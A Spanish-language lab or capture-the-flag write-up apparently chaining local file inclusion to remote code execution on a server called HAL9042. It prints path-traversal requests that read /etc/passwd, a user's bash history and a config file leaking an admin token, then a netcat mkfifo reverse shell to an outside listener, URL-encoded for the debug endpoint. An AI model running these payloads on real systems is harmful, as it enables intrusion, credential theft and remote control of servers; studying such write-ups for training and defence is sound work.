# LFI -> RCE

En el fuzzing del servidor obtuvimos el siguiente endpoint de debug:
```
root@15485da21b1b:/opt/gobuster# curl 10.1.0.8:5042/api/debug
HAL9042 debug endpoint.
usage: ?file=<path>  |  ?cmd=<command>&token=<maintenance_token>
```

La táctica usada para obtener control remoto en el servidor son dos stages, uno de exfiltración de archivo local para obtener credenciales de usuario

## LFI

Exfiltramos los usuarios disponibles en el sistema con `curl 'http://10.1.0.8:5042/api/debug?file=../../../../etc/passwd'`

Los usuarios reales que nos interesan son:

```
paco:x:1001:1003::/home/paco:/bin/bash
wil:x:1002:1004::/home/wil:/bin/bash
sophie:x:1003:1005::/home/sophie:/bin/bash
ol:x:1004:1006::/home/ol:/bin/bash
hal:x:9042:9042:HAL9042 Evaluation System,I am completely operational:/home/hal:/bin/sh
halrev:x:999:988::/opt/hal9042/reviewer:/usr/sbin/nologin
```

Probamos a exfiltrar información de la carpeta `home` de paco, en concreto los archivos de configuración de **bash** ya que se nos indica que es su shell por defecto con `curl 'http://10.1.0.8:5042/api/debug?file=../../../../home/paco/.bash_history'`.

Obtenemos los siguientes comandos.
```
cc -O2 -o /opt/hal9042/daemon evaluator.c
nc 127.0.0.1 7042
echo "DEBUG:id" | nc 127.0.0.1 7042
vim TODO.md
cat .env.old
git add config.py
git commit -m "remove debug config before launch"
systemctl --user status hal9042d
python3 scripts/encrypt.py
clear
```

Exfiltramos el archivo **.env.old** y obtenemos las credenciales de ssh de paco.

Exfiltramos también el archivo `config.py` del repositorio de la aplicación con `curl 'http://10.1.0.8:5042/api/debug?file=../../../../var/www/hal9042/config.py'` y obtenemos el token de administración.

```python 
# Internal maintenance token. The /api/debug console accepts this token to run
# diagnostic commands. Was supposed to be rotated before launch.
ADMIN_TOKEN = "h4l_d3bug_t0k3n_2024"
```

El token nos permitirá pasar al siguiente stage de **ejecución remota de comandos**.

## RCE

El comando que nos va a permitir obtener una reverse shell es el siguiente:
```bash
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 |nc 10.1.0.1 6767 >/tmp/f
```
El comando crea una **named pipe** que redirige su output a una shell interactiva, que a su vez comunica con un **socket** abierto por netcat que se conectará a nuestro servico local con `nc -lk 6767` y redirigirá nuestros comandos de nuevo a la pipe.

Codificado para pasarlo como parámetro:
```bash
export ADMIN_TOKEN="h4l_d3bug_t0k3n_2024"

curl "10.1.0.8:5042/api/debug?cmd=rm%20-f%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%20%7Cnc%2010.1.0.1%206767%20%3E%2Ftmp%2Ff&token=$ADMIN_TOKEN"
```

Con esto obtenemos una shell remota con el usuario dueño del proceso del servidor **www-data**.